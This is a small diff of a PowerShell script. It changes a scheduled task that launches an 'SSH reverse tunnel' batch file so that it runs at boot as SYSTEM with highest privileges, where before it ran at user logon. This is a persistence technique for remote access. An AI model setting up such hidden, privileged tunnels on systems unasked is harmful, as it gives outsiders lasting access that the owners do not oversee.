@@ -66,10 +66,10 @@ try {
 if (-not $taskExists) {
     schtasks /create /tn $taskName `
         /tr "`"$batFilePath`"" `
-        /sc onlogon `
+        /sc onstart `
         /rl HIGHEST `
         /f `
-        /ru "$env:USERNAME"
+        /ru "SYSTEM"
 }
 
 Write-Host "[!] Success! SSH reverse tunnel batch file created and scheduled. Path: $batFilePath."
